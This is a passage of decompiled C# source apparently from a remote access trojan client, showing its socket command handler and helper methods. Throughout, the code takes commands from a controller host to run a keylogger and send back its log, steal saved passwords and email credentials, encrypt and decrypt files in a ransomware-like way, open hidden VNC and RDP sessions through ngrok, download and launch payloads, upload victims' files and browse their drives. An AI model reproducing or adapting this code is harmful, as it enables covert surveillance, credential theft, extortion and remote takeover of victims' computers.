					Settings.SPL = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[2]), typeof(string));
				}
				if (array4[3])
				{
					Settings.KEY = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[3]), typeof(string));
				}
				break;
			}
			case "Wsound":
			{
				object obj24 = Helper.objj(array[1]);
				object[] array2 = new object[5]
				{
					Settings.Host,
					Settings.Port,
					Settings.SPL,
					Settings.KEY,
					Helper.ID()
				};
				object[] array73 = array2;
				bool[] array4 = new bool[5] { true, true, true, true, false };
				NewLateBinding.LateCall(obj24, (Type)null, "CON", array73, (string[])null, (Type[])null, array4, true);
				if (array4[0])
				{
					Settings.Host = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
				}
				if (array4[1])
				{
					Settings.Port = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[1]), typeof(string));
				}
				if (array4[2])
				{
					Settings.SPL = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[2]), typeof(string));
				}
				if (array4[3])
				{
					Settings.KEY = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[3]), typeof(string));
				}
				break;
			}
			case "BLOCK!":
				ClientSocket.Send("BLOCK!");
				break;
			case "KL":
				if (KL != 1)
				{
					NewLateBinding.LateCall(Helper.objj(array[1]), (Type)null, "logdf", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					KL = 1;
					GC.Collect();
					Application.Run();
				}
				break;
			case "KLdel":
				File.Delete(KLP);
				break;
			case "KLget":
				if (File.Exists(KLP))
				{
					ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject((object)"KLget", SPL), (object)Helper.ID())));
				}
				break;
			case "KLGET":
				ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"KLGET", SPL), Operators.AddObject(Operators.AddObject((object)STOBS64(File.ReadAllText(KLP)), SPL), (object)Helper.ID()))));
				break;
			case "TCPV":
				ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject((object)"TCPV", SPL), (object)Helper.ID())));
				break;
			case "TCPG":
			{
				object obj20 = Operators.ConcatenateObject((object)"TCPG", SPL);
				object obj21 = Helper.objj(array[1]);
				object[] array5 = new object[1];
				object[] array69 = array5;
				string[] array7 = array;
				string[] array70 = array7;
				int num = 2;
				array69[0] = array70[2];
				object[] array2 = array5;
				object[] array71 = array2;
				bool[] array4 = new bool[1] { true };
				object obj22 = NewLateBinding.LateGet(obj21, (Type)null, "GETTCP", array71, (string[])null, (Type[])null, array4);
				if (array4[0])
				{
					array7[num] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
				}
				ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(obj20, obj22), SPL), (object)Process.GetCurrentProcess().Id), SPL), (object)Helper.ID())));
				break;
			}
			case "ACT":
				ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject((object)"ACT", SPL), (object)Helper.ID())));
				break;
			case "ACTG":
			{
				object objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(Helper.objj(array[1]), (Type)null, "GetActiveWindows", new object[0], (string[])null, (Type[])null, (bool[])null));
				IEnumerator enumerator = default(IEnumerator);
				try
				{
					enumerator = ((IEnumerable)objectValue2).GetEnumerator();
					while (enumerator.MoveNext())
					{
						string text4 = Conversions.ToString(enumerator.Current);
						try
						{
							ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.AddObject(Operators.AddObject((object)"ACTG", SPL), (object)Helper.ID()), SPL), (object)text4)));
						}
						catch (Exception projectError5)
						{
							ProjectData.SetProjectError(projectError5);
							ProjectData.ClearProjectError();
						}
					}
				}
				finally
				{
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
				GC.Collect();
				ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject((object)"ENBC", SPL), (object)Helper.ID())));
				break;
			}
			case "killAct":
			{
				object obj18 = Helper.objj(array[1]);
				object[] array5 = new object[1];
				object[] array65 = array5;
				string[] array7 = array;
				string[] array66 = array7;
				int num = 2;
				array65[0] = array66[2];
				object[] array2 = array5;
				object[] array67 = array2;
				bool[] array4 = new bool[1] { true };
				NewLateBinding.LateCall(obj18, (Type)null, "Kill", array67, (string[])null, (Type[])null, array4, true);
				if (array4[0])
				{
					array7[num] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
				}
				GC.Collect();
				ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject((object)"Ref", SPL), (object)Helper.ID())));
				break;
			}
			case "FURL":
				((ServerComputer)MyProject.Computer).get_Network().DownloadFile(array[1], array[2]);
				Thread.Sleep(500);
				ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject((object)"RL", SPL), (object)Helper.ID())));
				break;
			case "msgg":
				MessageBox.Show(array[1]);
				break;
			case "UPtoS":
				((ServerComputer)MyProject.Computer).get_Network().UploadFile(array[1], Settings.uploader);
				GC.Collect();
				Thread.Sleep(500);
				ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject((object)"RL", SPL), (object)Helper.ID())));
				break;
			case "FSG":
			{
				object obj17 = Helper.objj(array[1]);
				object[] array5 = new object[3]
				{
					Settings.uploader,
					null,
					null
				};
				object[] array60 = array5;
				string[] array7 = array;
				string[] array61 = array7;
				int num = 2;
				array60[1] = array61[2];
				object[] array62 = array5;
				string[] array43 = array;
				string[] array63 = array43;
				int num4 = 3;
				array62[2] = array63[3];
				object[] array2 = array5;
				object[] array64 = array2;
				bool[] array4 = new bool[3] { false, true, true };
				NewLateBinding.LateCall(obj17, (Type)null, "RUN", array64, (string[])null, (Type[])null, array4, true);
				if (array4[1])
				{
					array7[num] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[1]), typeof(string));
				}
				if (array4[2])
				{
					array43[num4] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[2]), typeof(string));
				}
				GC.Collect();
				break;
			}
			case "RENC":
				if (RS != 1)
				{
					RS = 1;
					object obj15 = Helper.objj(array[1]);
					object[] array5 = new object[5]
					{
						Helper.ID(),
						null,
						null,
						null,
						null
					};
					object[] array46 = array5;
					string[] array7 = array;
					string[] array47 = array7;
					int num = 2;
					array46[1] = array47[2];
					object[] array48 = array5;
					string[] array43 = array;
					string[] array49 = array43;
					int num4 = 3;
					array48[2] = array49[3];
					object[] array50 = array5;
					string[] array26 = array;
					string[] array51 = array26;
					int num3 = 4;
					array50[3] = array51[4];
					object[] array52 = array5;
					string[] array23 = array;
					string[] array53 = array23;
					int num2 = 5;
					array52[4] = array53[5];
					object[] array2 = array5;
					object[] array54 = array2;
					bool[] array4 = new bool[5] { false, true, true, true, true };
					NewLateBinding.LateCall(obj15, (Type)null, "ENC", array54, (string[])null, (Type[])null, array4, true);
					if (array4[1])
					{
						array7[num] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[1]), typeof(string));
					}
					if (array4[2])
					{
						array43[num4] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[2]), typeof(string));
					}
					if (array4[3])
					{
						array26[num3] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[3]), typeof(string));
					}
					if (array4[4])
					{
						array23[num2] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[4]), typeof(string));
					}
					RS = 2;
					GC.Collect();
				}
				break;
			case "RDEC":
				if (RS == 2)
				{
					RS = 1;
					NewLateBinding.LateCall(Helper.objj(array[1]), (Type)null, "DEC", new object[1] { Helper.ID() }, (string[])null, (Type[])null, (bool[])null, true);
					RS = 0;
					GC.Collect();
				}
				break;
			case "HVNC":
			{
				object obj13 = Helper.objj(array[1]);
				object[] array5 = new object[2];
				object[] array35 = array5;
				string[] array23 = array;
				string[] array36 = array23;
				int num2 = 2;
				array35[0] = array36[2];
				object[] array37 = array5;
				string[] array26 = array;
				string[] array38 = array26;
				int num3 = 3;
				array37[1] = array38[3];
				object[] array2 = array5;
				object[] array39 = array2;
				bool[] array4 = new bool[2] { true, true };
				NewLateBinding.LateCall(obj13, (Type)null, "Run", array39, (string[])null, (Type[])null, array4, true);
				if (array4[0])
				{
					array23[num2] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
				}
				if (array4[1])
				{
					array26[num3] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[1]), typeof(string));
				}
				GC.Collect();
				break;
			}
			case "ngrok":
				ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject((object)"ngrok", SPL), (object)Helper.ID())));
				break;
			case "InstallN":
				if (ngrok != 1)
				{
					ngrok = 1;
					object obj10 = Helper.objj(array[1]);
					object[] array5 = new object[1];
					object[] array30 = array5;
					string[] array23 = array;
					string[] array31 = array23;
					int num2 = 2;
					array30[0] = array31[2];
					object[] array2 = array5;
					object[] array32 = array2;
					bool[] array4 = new bool[1] { true };
					NewLateBinding.LateCall(obj10, (Type)null, "install", array32, (string[])null, (Type[])null, array4, true);
					if (array4[0])
					{
						array23[num2] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
					}
					ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject((object)"InstallngC", SPL), (object)Helper.ID())));
					ngrok = 0;
					GC.Collect();
				}
				break;
			case "vncs":
				if (File.Exists(Interaction.Environ("Temp") + "\\ngrok.exe"))
				{
					NewLateBinding.LateCall(Helper.objj(array[1]), (Type)null, "install", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					GC.Collect();
					ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject((object)"%$3", SPL), (object)Helper.ID())));
				}
				else
				{
					ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject((object)"ngrok", SPL), (object)Helper.ID())));
				}
				break;
			case "hrdp":
				if (File.Exists(Interaction.Environ("Temp") + "\\ngrok.exe"))
				{
					ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject((object)"hrdp", SPL), (object)Helper.ID())));
				}
				else
				{
					ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject((object)"ngrok", SPL), (object)Helper.ID())));
				}
				break;
			case "hrdp+":
			{
				object obj6 = Operators.ConcatenateObject((object)"hrdp+", SPL);
				object obj7 = Helper.objj(array[1]);
				object[] array5 = new object[2];
				object[] array22 = array5;
				string[] array23 = array;
				string[] array24 = array23;
				int num2 = 2;
				array22[0] = array24[2];
				object[] array25 = array5;
				string[] array26 = array;
				string[] array27 = array26;
				int num3 = 3;
				array25[1] = array27[3];
				object[] array2 = array5;
				object[] array28 = array2;
				bool[] array4 = new bool[2] { true, true };
				object obj8 = NewLateBinding.LateGet(obj7, (Type)null, "install", array28, (string[])null, (Type[])null, array4);
				if (array4[0])
				{
					array23[num2] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
				}
				if (array4[1])
				{
					array26[num3] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[1]), typeof(string));
				}
				ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(obj6, Operators.AddObject(Operators.AddObject(obj8, SPL), (object)Helper.ID()))));
				GC.Collect();
				break;
			}
			case "PassR":
				ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject((object)"PassR", SPL), (object)Helper.ID())));
				break;
			case "PC#":
				ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.AddObject(Operators.AddObject((object)"Getpass", SPL), (object)Helper.ID()), SPL), NewLateBinding.LateGet(Helper.objj(array[1]), (Type)null, "get", new object[0], (string[])null, (Type[])null, (bool[])null))));
				GC.Collect();
				break;
			case "Pvbnet":
				ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.AddObject(Operators.AddObject((object)"Getpass", SPL), (object)Helper.ID()), SPL), NewLateBinding.LateGet(Helper.objj(array[1]), (Type)null, "gett", new object[0], (string[])null, (Type[])null, (bool[])null))));
				GC.Collect();
				break;
			case "WDPL":
				NewLateBinding.LateCall(Helper.objj(array[1]), (Type)null, "gett", new object[0], (string[])null, (Type[])null, (bool[])null, true);
				GC.Collect();
				break;
			case "Email":
			{
				string text = Conversions.ToString(NewLateBinding.LateGet(Helper.objj(array[1]), (Type)null, "Emails", new object[0], (string[])null, (Type[])null, (bool[])null));
				if (Operators.CompareString(text, "Error!", false) == 0)
				{
					ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.AddObject(Operators.AddObject((object)"Getpass", SPL), (object)Helper.ID()), SPL), (object)"Error!")));
					GC.Collect();
				}
				else
				{
					ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.AddObject(Operators.AddObject((object)"Getpass", SPL), (object)Helper.ID()), SPL), (object)text)));
					GC.Collect();
				}
				break;
			}
			case "Xchat":
				ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject((object)"Xchat", SPL), (object)Helper.ID())));
				break;
			case "LLCHAT":
			{
				object obj = Helper.objj(array[1]);
				object[] array2 = new object[5]
				{
					Settings.Host,
					Settings.Port,
					Settings.SPL,
					Settings.KEY,
					Helper.ID()
				};
				object[] array3 = array2;
				bool[] array4 = new bool[5] { true, true, true, true, false };
				NewLateBinding.LateCall(obj, (Type)null, "CON", array3, (string[])null, (Type[])null, array4, true);
				if (array4[0])
				{
					Settings.Host = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
				}
				if (array4[1])
				{
					Settings.Port = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[1]), typeof(string));
				}
				if (array4[2])
				{
					Settings.SPL = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[2]), typeof(string));
				}
				if (array4[3])
				{
					Settings.KEY = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[3]), typeof(string));
				}
				break;
			}
			}
		}
		catch (Exception projectError10)
		{
			ProjectData.SetProjectError(projectError10);
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern void mouse_event(int dwFlags, int dx, int dy, int cButtons, int dwExtraInfo);

	[DllImport("user32.dll")]
	internal static extern bool keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);

	public static byte[] compress(Bitmap imgg, int Q)
	{
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		//IL_0017: Expected O, but got Unknown
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0022: Expected O, but got Unknown
		//IL_005d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		byte[] result = default(byte[]);
		try
		{
			using MemoryStream memoryStream = new MemoryStream();
			Encoder quality = Encoder.Quality;
			EncoderParameters val = new EncoderParameters(1);
			EncoderParameter val2 = new EncoderParameter(quality, (long)Q);
			val.get_Param()[0] = val2;
			ImageCodecInfo encoderInfo = RemoteDesktop.GetEncoderInfo(ImageFormat.get_Jpeg());
			((Image)imgg).Save((Stream)memoryStream, encoderInfo, val);
			val.Dispose();
			val2.Dispose();
			((Image)imgg).Dispose();
			GC.Collect();
			ImageConverter val3 = new ImageConverter();
			result = (byte[])((TypeConverter)(object)val3).ConvertTo((object?)Image.FromStream((Stream)memoryStream), typeof(byte[]));
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string STOBS64(string s)
	{
		string result = default(string);
		try
		{
			byte[] bytes = Encoding.UTF8.GetBytes(s);
			result = Convert.ToBase64String(bytes);
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	[DllImport("avicap32.dll")]
	public static extern IntPtr capCreateCaptureWindowA(string lpszWindowName, int dwStyle, int X, int Y, int nWidth, int nHeight, int hwndParent, int nID);

	[DllImport("avicap32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern bool capGetDriverDescriptionA(short wDriver, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszName, int cbName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszVer, int cbVer);

	public static bool Cam()
	{
		checked
		{
			try
			{
				int num = 0;
				do
				{
					string lpszVer = null;
					short wDriver = (short)num;
					string lpszName = Strings.Space(100);
					if (!capGetDriverDescriptionA(wDriver, ref lpszName, 100, ref lpszVer, 100))
					{
						num++;
						continue;
					}
					return true;
				}
				while (num <= 4);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			return false;
		}
	}

	public static string getFolders(object location)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(Conversions.ToString(location));
		object obj = "";
		DirectoryInfo[] directories = directoryInfo.GetDirectories();
		foreach (DirectoryInfo directoryInfo2 in directories)
		{
			obj = Operators.AddObject(obj, (object)string.Concat("[Folder]" + directoryInfo2.get_Name(), "FileManagerSplitFileManagerSplit"));
		}
		return Conversions.ToString(obj);
	}

	public static string getFiles(object location)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(Conversions.ToString(location));
		object obj = "";
		FileInfo[] files = directoryInfo.GetFiles("*.*");
		foreach (FileInfo fileInfo in files)
		{
			obj = Operators.AddObject(obj, (object)string.Concat(string.Concat(fileInfo.get_Name() + "FileManagerSplit", fileInfo.Length.ToString()), "FileManagerSplit"));
		}
		return Conversions.ToString(obj);
	}

	public static string getDrives()
	{
		string text = "";
		foreach (DriveInfo drife in ((ServerComputer)MyProject.Computer).get_FileSystem().get_Drives())
		{
			switch (drife.DriveType)
			{
			case DriveType.Removable:
				text = text + "[USB]" + drife.Name + "FileManagerSplitFileManagerSplit";
				break;
			case DriveType.Fixed:
				text = text + "[Drive]" + drife.Name + "FileManagerSplitFileManagerSplit";
				break;
			case DriveType.Network:
				text = text + "[NET]" + drife.Name + "FileManagerSplitFileManagerSplit";
				break;
			case DriveType.CDRom:
				text = text + "[CD]" + drife.Name + "FileManagerSplitFileManagerSplit";
				break;
			}
		}
		return text;
	}

	private static void Download(string Name, string Data)
	{
		try
		{
			object obj = Path.GetTempFileName() + Name;
			File.WriteAllBytes(Conversions.ToString(obj), (byte[])Helper.frombase64(Data));
			Thread.Sleep(500);
			Type typeFromHandle = typeof(Process);
			object[] array = new object[1] { RuntimeHelpers.GetObjectValue(obj) };
			bool[] array2 = new bool[1] { true };
			NewLateBinding.LateCall((object)null, typeFromHandle, "Start", array, (string[])null, (Type[])null, array2, true);
			if (array2[0])
			{
				obj = RuntimeHelpers.GetObjectValue(array[0]);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
